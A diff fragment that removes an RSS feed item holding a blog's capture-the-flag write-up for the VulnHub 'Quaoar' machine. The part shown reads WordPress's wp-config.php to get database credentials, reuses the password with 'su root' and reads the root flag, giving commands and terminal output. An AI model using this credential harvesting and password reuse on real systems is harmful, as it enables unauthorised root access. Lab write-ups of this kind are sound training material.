-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
-drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    100 Oct 24  2016 index.html
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data    271 Oct 24  2016 robots.txt
-drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
-drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
-drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
-www-data@Quaoar:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wordpress
-www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;wp-config.php
-
-/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
-define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
-define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Will it work? &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@Quaoar:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
-su root
-Password: rootpassword!
-root@Quaoar:/var/www/wordpress# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
-root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 48
-drwx------  6 root root 4096 Nov 30  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
-drwx------  2 root root 4096 Oct  7  2016 .aptitude
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  368 Jan 15  2017 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Apr 19  2012 .bashrc
-drwx------  2 root root 4096 Oct 15  2016 .cache
-&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;  1 root root   33 Oct 22  2016 flag.txt
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Apr 19  2012 .profile
-drwx------  2 root root 4096 Oct 26  2016 .ssh
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4740 Nov 30  2016 .viminfo
-drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
-root@Quaoar:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
-8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We have the last flag, together with the root access! &lt;/p&gt;
-</description>
-        <pubDate>Sat, 19 Aug 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/vulnhub-quaoar/</link>
-        <guid isPermaLink="true">http://localhost:4000/vulnhub-quaoar/</guid>
       </item>
     
   </channel>
